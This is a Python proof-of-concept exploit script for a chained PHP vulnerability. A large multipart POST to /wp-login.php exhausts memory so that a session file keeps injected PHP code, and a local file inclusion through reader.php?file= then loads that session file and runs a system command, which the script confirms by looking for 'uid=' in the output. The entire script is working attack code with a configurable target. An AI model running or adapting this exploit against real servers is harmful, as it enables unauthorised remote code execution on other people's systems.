#!/usr/bin/env python3
"""
CVE-2026-109619 → RCE via OOM + LFI (pure HTTP, no SSH)

Chain:
  1. OOM via multipart POST (post_max_size=256M > memory_limit=128M)
     → session RSHUTDOWN skipped → session file preserved with PHP code
  2. LFI via reader.php?file=/tmp/sess_<SID> → includes session → RCE
"""
import os, socket, ssl, sys, threading, time

HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "443"))
SID  = "exploit002"
SESS = f"/var/lib/php/session/sess_{SID}"
CMD  = "id"
PHP  = f"<?php system('{CMD}');die(); ?>"

def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        dt = p["data"].encode() if isinstance(p["data"], str) else p["data"]
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)

def https_req(method, path, body=None, bnd=None, cookie=None, timeout=180):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw_sock = socket.create_connection((HOST, PORT), timeout=30)
    sock = ctx.wrap_socket(raw_sock, server_hostname=HOST)
    sock.settimeout(timeout)

    headers = f"{method} {path} HTTP/1.1\r\nHost: {HOST}\r\n"
    if cookie:
        headers += f"Cookie: {cookie}\r\n"
    if body:
        headers += f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
        headers += f"Content-Length: {len(body)}\r\n"
    headers += "Connection: close\r\n\r\n"

    data = bytearray()
    def rx():
        try:
            while True:
                c = sock.recv(65536)
                if not c:
                    break
                data.extend(c)
        except Exception:
            pass
    t = threading.Thread(target=rx, daemon=True)
    t.start()
    try:
        sock.sendall(headers.encode())
        if body:
            for off in range(0, len(body), 262144):
                sock.sendall(body[off:off + 262144])
    except (BrokenPipeError, ConnectionResetError, ssl.SSLError):
        pass
    t.join(timeout=timeout + 1)
    sock.close()
    return bytes(data)

def resp_body(raw):
    return raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else raw

def resp_status(raw):
    return raw.split(b"\r\n", 1)[0].decode("latin1") if raw else "(empty)"

# ═══════════════════════════════════════════════════════
print("=" * 62)
print("CVE-2026-109619  HTTP → RCE  (no SSH, pure HTTP)")
print(f"Target {HOST}:{PORT}   CMD: {CMD}")
print(f"Session: {SESS}")
print("=" * 62)

# ── 1  OOM trigger ────────────────────────────────────
print(f"\n[1] OOM trigger: multipart POST with PHP code in filename")
print(f"    payload: {PHP}")

body = multipart([
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "pwn"},
    {"name": "f", "filename": PHP, "data": b"A" * 64},
    {"name": "pad1", "data": b"B" * (70 * 1024 * 1024)},
    {"name": "pad2", "data": b"C" * (70 * 1024 * 1024)},
], b"BOOM")
print(f"    body size: {len(body) / (1024*1024):.1f} MB")
print(f"    sending ...", flush=True)

r1 = https_req("POST", "/wp-login.php", body, b"BOOM",
               cookie=f"PHPSESSID={SID}")
print(f"    response: {resp_status(r1)}")

if b"500" in r1[:50] or len(r1) == 0:
    print("    ✓ OOM triggered (500 / connection reset)")
else:
    print(f"    ? unexpected: {resp_status(r1)}")

time.sleep(0.5)

# ── 2  LFI → RCE ─────────────────────────────────────
print(f"\n[2] LFI trigger: GET /reader.php?file={SESS}")

r2 = https_req("GET", f"/reader.php?file={SESS}", timeout=10)
out = resp_body(r2).decode("latin1", errors="replace")
print(f"    response: {resp_status(r2)}")

# ── result ────────────────────────────────────────────
print("\n" + "=" * 62)
if "uid=" in out:
    idx = out.index("uid=")
    end = out.find("\n", idx)
    line = out[idx:end].strip() if end > 0 else out[idx:idx + 80].strip()
    print(f"  ★  RCE confirmed: {line}")
    print(f"  ★  Chain: OOM (session preserved) → LFI (session included) → RCE")
elif out.strip():
    print(f"  ?  response ({len(out)} chars):")
    print(f"     {out[:500]}")
else:
    print("  ✗  empty response — session file may not exist or OOM didn't preserve it")
print("=" * 62)
